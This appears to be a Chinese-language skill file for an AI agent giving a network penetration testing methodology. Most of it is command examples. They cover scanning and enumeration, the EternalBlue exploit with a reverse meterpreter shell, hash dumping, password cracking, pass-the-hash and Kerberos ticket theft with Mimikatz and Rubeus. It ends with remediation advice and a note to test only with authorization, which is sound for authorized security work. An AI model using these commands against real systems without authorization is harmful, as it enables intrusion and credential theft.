---
name: network-penetration-testing
description: 网络渗透测试的专业技能和方法论
version: 1.0.0
---

# 网络渗透测试

## 概述

网络渗透测试是评估网络基础设施安全性的重要环节。本技能提供网络渗透测试的方法、工具和最佳实践。

## 测试范围

### 1. 信息收集

**检查项目：**
- 网络拓扑
- 主机发现
- 端口扫描
- 服务识别

### 2. 漏洞扫描

**检查项目：**
- 系统漏洞
- 服务漏洞
- 配置错误
- 弱密码

### 3. 漏洞利用

**检查项目：**
- 远程代码执行
- 权限提升
- 横向移动
- 持久化

## 信息收集

### 网络扫描

**使用Nmap：**
```bash
# 主机发现
nmap -sn 192.168.1.0/24

# 端口扫描
nmap -sS -p- 192.168.1.100

# 服务识别
nmap -sV -sC 192.168.1.100

# 操作系统识别
nmap -O 192.168.1.100

# 完整扫描
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**使用Masscan：**
```bash
# 快速端口扫描
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### 服务枚举

**SMB枚举：**
```bash
# 枚举SMB共享
smbclient -L //192.168.1.100 -N

# 枚举SMB用户
enum4linux -U 192.168.1.100

# 使用nmap脚本
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC枚举：**
```bash
# 枚举RPC服务
rpcclient -U "" -N 192.168.1.100

# 使用nmap脚本
nmap --script rpc-enum 192.168.1.100
```

**SNMP枚举：**
```bash
# SNMP扫描
snmpwalk -v2c -c public 192.168.1.100

# 使用onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## 漏洞扫描

### 使用Nessus

```bash
# 启动Nessus
# 访问Web界面
# 创建扫描任务
# 分析扫描结果
```

### 使用OpenVAS

```bash
# 启动OpenVAS
gvm-setup

# 访问Web界面
# 创建扫描任务
# 分析扫描结果
```

### 使用Nmap脚本

```bash
# 漏洞扫描
nmap --script vuln 192.168.1.100

# 特定漏洞扫描
nmap --script smb-vuln-ms17-010 192.168.1.100

# 所有脚本
nmap --script all 192.168.1.100
```

## 漏洞利用

### Metasploit

**基础使用：**
```bash
# 启动Metasploit
msfconsole

# 搜索漏洞
search ms17-010

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue

# 设置参数
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# 执行
exploit
```

**后渗透：**
```bash
# 获取系统信息
sysinfo

# 获取权限
getsystem

# 迁移进程
migrate <pid>

# 获取哈希
hashdump

# 获取密码
run post/windows/gather/smart_hashdump
```

### 常见漏洞利用

**EternalBlue：**
```bash
# 使用Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# 使用独立工具
python eternalblue.py 192.168.1.100
```

**BlueKeep：**
```bash
# 使用Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost：**
```bash
# 使用独立工具
python smbghost.py 192.168.1.100
```

## 横向移动

### 密码破解

**使用Hashcat：**
```bash
# 破解NTLM哈希
hashcat -m 1000 hashes.txt wordlist.txt

# 破解LM哈希
hashcat -m 3000 hashes.txt wordlist.txt

# 使用规则
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**使用John：**
```bash
# 破解哈希
john hashes.txt

# 使用字典
john --wordlist=wordlist.txt hashes.txt

# 使用规则
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**使用Impacket：**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### 票据传递

**使用Mimikatz：**
```bash
# 提取票据
sekurlsa::tickets /export

# 注入票据
kerberos::ptt ticket.kirbi
```

**使用Rubeus：**
```bash
# 请求票据
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# 注入票据
Rubeus.exe ptt /ticket:ticket.kirbi
```

## 工具使用

### Nmap

```bash
# 完整扫描
nmap -sS -sV -sC -O -p- -T4 target

# 隐蔽扫描
nmap -sS -T2 -f -D RND:10 target

# UDP扫描
nmap -sU -p- target
```

### Metasploit

```bash
# 启动框架
msfconsole

# 数据库初始化
msfdb init

# 导入扫描结果
db_import nmap.xml

# 查看主机
hosts

# 查看服务
services
```

### Burp Suite

**网络扫描：**
1. 配置代理
2. 浏览目标网络
3. 分析流量
4. 主动扫描

## 测试清单

### 信息收集
- [ ] 网络拓扑发现
- [ ] 主机发现
- [ ] 端口扫描
- [ ] 服务识别
- [ ] 操作系统识别

### 漏洞扫描
- [ ] 系统漏洞扫描
- [ ] 服务漏洞扫描
- [ ] 配置错误检查
- [ ] 弱密码检查

### 漏洞利用
- [ ] 远程代码执行
- [ ] 权限提升
- [ ] 横向移动
- [ ] 持久化

## 常见安全问题

### 1. 未打补丁的系统

**问题：**
- 系统未及时更新
- 存在已知漏洞
- 补丁管理不当

**修复：**
- 及时安装补丁
- 建立补丁管理流程
- 定期安全更新

### 2. 弱密码

**问题：**
- 默认密码
- 简单密码
- 密码重用

**修复：**
- 实施强密码策略
- 启用多因素认证
- 定期更换密码

### 3. 开放端口

**问题：**
- 不必要的端口开放
- 服务暴露
- 防火墙配置错误

**修复：**
- 关闭不必要端口
- 实施防火墙规则
- 使用VPN访问

### 4. 配置错误

**问题：**
- 默认配置
- 权限过大
- 服务配置不当

**修复：**
- 安全配置基线
- 最小权限原则
- 定期配置审查

## 最佳实践

### 1. 信息收集

- 全面扫描
- 多工具验证
- 记录发现
- 分析结果

### 2. 漏洞利用

- 授权测试
- 最小影响
- 记录操作
- 及时清理

### 3. 报告编写

- 详细记录
- 风险评级
- 修复建议
- 验证步骤

## 注意事项

- 仅在授权环境中进行测试
- 避免对生产系统造成影响
- 遵守法律法规
- 保护测试数据